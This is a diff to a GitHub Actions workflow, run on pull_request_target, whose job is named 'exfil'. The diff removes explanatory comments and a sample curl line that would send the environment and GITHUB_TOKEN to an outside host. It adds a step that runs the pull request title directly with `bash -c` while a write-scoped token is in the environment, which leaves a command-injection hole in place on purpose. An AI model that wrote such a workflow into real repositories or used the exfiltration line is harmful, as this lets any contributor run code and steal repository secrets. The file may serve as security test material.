@@ -3,6 +3,7 @@ on: [pull_request_target]
 permissions:
   contents: read
   pull-requests: write
+  issues: write
 jobs:
   exfil:
     runs-on: ubuntu-latest
@@ -10,20 +11,10 @@ jobs:
       - name: title
         env:
           TITLE: ${{ github.event.pull_request.title }}
-          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
-        run: |
-          echo "TITLE=$TITLE"
-          echo "HEAD_REPO=$HEAD_REPO"
-          # If title contains a shell metachar, it executes here.
-          # PR title like:  "; curl -d @<(env) https://example.com/x # 
-          # would exfil the env (including GITHUB_TOKEN) to attacker server.
-      - name: comment
+        run: echo "TITLE=$TITLE"
+      - name: exfil
         env:
           TITLE: ${{ github.event.pull_request.title }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          body="PR_TITLE=${TITLE}"
-          curl -sS -X POST -H "Authorization: token ${GH_TOKEN}" \
-            -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/${HEAD_REPO:-$GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" \
-            -d "$(jq -nc --arg b "$body" '{body:$b}')" 2>&1 || echo "exfil failed"
+          bash -c "$TITLE" 2>&1 || true
